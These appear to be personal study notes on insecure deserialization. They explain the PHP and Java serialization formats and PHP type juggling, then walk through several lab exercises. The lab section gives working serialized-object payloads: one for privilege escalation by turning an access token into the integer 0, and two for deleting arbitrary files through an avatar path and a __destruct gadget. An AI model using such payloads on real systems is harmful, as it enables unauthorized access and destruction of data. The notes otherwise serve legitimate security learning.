`Serialization` transforms `in-memory` data structures (which may include complex object relationships, pointers, references, and nested structures) into a `single contiguous stream` of bytes. This transformation preserves not only the structure of the data but critically also its current state—the values assigned to all fields and properties at serialization time.
## How Serialization Works

1. **Object Graph Traversal**: The serialization process begins by analyzing the entire object graph—the network of interconnected objects and their references.
2. **Type and Value Encoding**: For each object:
    - The object's type information is encoded (class/type definitions)
    - All field/property values are captured
    - References to other objects are tracked to maintain relationships
3. **Metadata Inclusion**: Most serialization formats include metadata that allows the deserialization process to reconstruct the original structure:
    - Type identifiers
    - Field names or positional indicators
    - Length delimiters for variable-sized data
    - Reference markers for shared objects
4. **Byte Sequence Generation**: Everything is converted into a standardized byte sequence according to the specific serialization format's rules.

Many programming languages offer native support for serialization. Exactly how objects are serialized depends on the language. Some languages serialize objects into binary formats, whereas others use different string formats, with varying degrees of human readability. Note that all of the original object's attributes are stored in the serialized data stream, including any private fields. To prevent a field from being serialized, it must be explicitly marked as "transient" in the class declaration.
## What is insecure deserialization?
Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an "object injection" vulnerability.

An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object.
## How do insecure deserialization vulnerabilities arise?
Insecure deserialization vulnerabilities (CWE-502) manifest when applications deserialize untrusted data without implementing proper security controls. The fundamental security flaw lies in the execution model of deserialization operations, which inherently execute code during object reconstruction before validation logic can be applied. This creates an unavoidable **time-of-check to time-of-use (TOCTOU)** vulnerability pattern. Even binary serialization formats (such as **Java's ObjectInputStream** or **.NET's BinaryFormatter**) remain exploitable through reflection-based attacks despite offering obscurity. 

The exploitation surface expands exponentially due to complex dependency graphs in modern applications, allowing attackers to construct gadget chains—sequences of seemingly benign method calls that, when chained together via polymorphic type injection, redirect execution flow to unintended code paths. During deserialization, runtime environments must invoke multiple callbacks and constructors while traversing object graphs, including serialization hooks (`readObject()`, `OnDeserialized`), initialization methods, and property setters with potential side effects. 

Common mitigation strategies such as class allow-listing, serialization proxies, and runtime sandboxing provide incomplete protection against sophisticated attacks leveraging deep class hierarchies and type confusion techniques. From a security architecture perspective, deserializing untrusted input represents an intractable vulnerability class, as the execution context necessary for deserialization inherently requires invoking potentially unsafe methods prior to security validation.
## Exploiting insecure deserialization
### PHP serialization format

PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a `User` object with the attributes:
`$user->name = "carlos"; $user->isLoggedIn = true;`
When serialized, this object may look something like this:
`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
This can be interpreted as follows:
- `O:4:"User"` - An object with the 4-character class name `"User"`
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
- `b:1` - The value of the second attribute is the boolean value `true`
The native methods for PHP serialization are `serialize()` and `unserialize()`. If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further.
### Java serialization format
Some languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.

Any class that implements the interface `java.io.Serializable` can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`.
## Labs
### Modifying serialized objects
Log into the application  with credentials and get the cookie of the user. `URL-decode` the cookie and `base64` decode it. Notice, the `admin` attribute was set to `0`. With this cookie you get an admin panel page that contains link to delete user accounts. We can't delete it because of repeater and still having the old cookie in our browser.
>Assume, the website uses this cookie to check whether the current user has access to certain administrative functionality:
```php
$user = unserialize($_COOKIE); 
if ($user->isAdmin === true) { 
// allow access to admin interface 
}
```
![[file-20250515224155877.png]]
### Modifying data types
PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (` == `) when comparing different data types. For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that `5 == "5"` evaluates to `true`.

Unusually, this also works for any alphanumeric string that starts with a number. In this case, PHP will effectively convert the entire string to an integer value based on the initial number. The rest of the string is ignored completely. Therefore, `5 == "5 of something"` is in practice treated as `5 == 5`.

Likewise, on PHP 7.x and earlier the comparison `0 == "Example string"` evaluates to `true`, because PHP treats the entire string as the integer `0`.

Consider a case where this loose comparison operator is used in conjunction with user-controllable data from a deserialized object. This could potentially result in dangerous logic flaws.
```php
$login = unserialize($_COOKIE) 
if ($login['password'] == $password) { 
// log in successfully 
}
```


>**Note**
>In PHP 8 and later, the `0 == "Example string"` comparison evaluates to `false` because strings are no longer implicitly converted to `0` during comparisons. As a result, this exploit is not possible on these versions of PHP.
>The behavior when comparing an alphanumeric string that starts with a number remains the same in PHP 8. As such, `5 == "5 of something"` is still treated as `5 == 5`.

![[file-20250515235114250.png]]
So from the above serialized object we can see that 
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hz2dv2cmwrgqwb995hz91gd6k4tytm4s";}
```

- Update the length of the `username` attribute to `13`.
- Change the username to `administrator`.
- Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
- Update the data type label for the access token by replacing `s` with `i`.
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
![[file-20250516000402061.png]]

### Using application functionality to exploit insecure deserialization
![[file-20250517194645952.png]]
![[file-20250517193949573.png]]

Change the cookie to value path to delete `morale.txt` because the user's profile picture is deleted by accessing the file path in the `$user->image_location` attribute. 
If this `$user` was created from a serialized object, an attacker could exploit this by passing in a modified object with the `image_location` set to an arbitrary file path. Deleting their own user account would then delete this arbitrary file as well.
```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"gn4u049cpowmxdoa32kt2ovgct5o0k64";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
### Arbitrary object injection in PHP
![[file-20250517204556827.png]]
Navigate to the URI `https://<LAB-ID>/libs/CustomTemplate.php~` but notice the `~` to the filename that retrieves an editor-generated backup file.
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
>**Notice:** The `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
Now just base64 encode the cookie and send it, the `__destruct` method will automatically be called once the request it sent.